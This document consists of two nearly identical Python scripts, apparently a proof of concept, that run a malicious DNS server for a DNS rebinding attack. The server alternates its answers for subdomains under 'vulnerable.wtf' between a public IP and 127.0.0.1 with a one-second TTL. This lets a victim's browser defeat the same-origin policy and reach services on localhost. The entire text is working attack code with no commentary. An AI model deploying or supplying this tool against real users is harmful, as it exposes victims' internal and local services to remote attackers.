import SocketServer
from scapy.all import *

server_ip = '213.239.212.180'  # set this to your servers ip
server_domain = 'sop.vulnerable.wtf.'  # this is the subdomain serving index.html
reply_map = {
    'cors.vulnerable.wtf.': ('213.239.212.180', '127.0.0.1')
}


class DNSServer(SocketServer.BaseRequestHandler):
    _replied = set()

    def handle(self):
        pkt = DNS(self.request[0])
        socket = self.request[1]
        dst_ip, dst_port = socket.getsockname()
        src_ip, src_port = self.client_address

        if pkt.haslayer(DNSQR) \
                and pkt[DNSQR].qtype == 1:

            print 'got query', pkt.summary()
            qname = pkt[DNSQR].qname
            domain = qname.partition('.')[-1]

            if domain in reply_map or qname == server_domain:

                # rotation between both IPs on each request
                if qname in self._replied:
                    spoofed_ip = reply_map[domain][1]
                    self._replied.remove(qname)
                elif qname == server_domain:
                    spoofed_ip = server_ip
                else:
                    spoofed_ip = reply_map[domain][0]
                    self._replied.add(qname)

                # build reply packet
                reply = DNS(
                    id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                    ancount=1, rd=1,
                    an=DNSRR(
                        rrname=qname, ttl=1,
                        rdata=spoofed_ip
                    )
                )

                socket.sendto(str(reply), self.client_address)
                print 'sent reply', reply.summary()

if __name__ == '__main__':
    server = SocketServer.UDPServer((server_ip, 53), DNSServer)
    server.serve_forever()


import SocketServer
from scapy.all import *

server_ip = '213.239.212.180'  # set this to your servers ip
server_domain = 'sop.vulnerable.wtf.'  # this is the subdomain serving index.html
reply_map = {
    'sop.vulnerable.wtf.': ('213.239.212.180', '127.0.0.1')  # (original, spoofed)
}

class DNSServer(SocketServer.BaseRequestHandler):
    _replied = set()

    def handle(self):
        pkt = DNS(self.request[0])
        socket = self.request[1]
        dst_ip, dst_port = socket.getsockname()
        src_ip, src_port = self.client_address

        if pkt.haslayer(DNSQR) \
                and pkt[DNSQR].qtype == 1:

            print 'got query', pkt.summary()
            qname = pkt[DNSQR].qname
            domain = qname.partition('.')[-1]

            if domain in reply_map or qname == server_domain:

                # rotation between both IPs on each request
                if qname in self._replied:
                    spoofed_ip = reply_map[domain][1]
                    self._replied.remove(qname)
                elif qname == server_domain:
                    spoofed_ip = server_ip
                else:
                    spoofed_ip = reply_map[domain][0]
                    self._replied.add(qname)

                # build reply packet
                reply = DNS(
                        id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                        ancount=1, rd=1,
                        an=DNSRR(
                            rrname=qname, ttl=1,
                            rdata=spoofed_ip
                        )
                    )

                socket.sendto(str(reply), self.client_address)
                print 'sent reply', reply.summary()

if __name__ == '__main__':
    server = SocketServer.UDPServer((server_ip, 53), DNSServer)
    server.serve_forever()
